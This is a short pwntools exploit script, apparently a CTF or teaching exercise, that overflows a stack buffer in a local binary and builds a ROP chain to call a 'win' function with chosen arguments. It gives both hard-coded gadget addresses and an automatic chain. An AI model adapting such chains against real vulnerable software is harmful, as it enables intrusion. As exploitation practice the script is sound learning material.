#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template example
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "example")

# Set your terminal for gdb here
context.terminal = ["terminator", "-e"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No
# Debuginfo:  Yes

io = start()

payload = b"A" * 16

if args.MANUAL:
    payload += p64(0x0000000000401164)  # pop rdi; ret
    payload += p64(0xDEADBEEF)
    payload += p64(0x0000000000401166)  # pop rsi; ret
    payload += p64(42)
    payload += p64(exe.sym["win"])
else:
    rop = ROP(exe)
    rop.call(exe.sym["win"], [0xDEADBEEF, 42])
    payload += rop.chain()

io.sendline(payload)
print(io.recvline().decode())
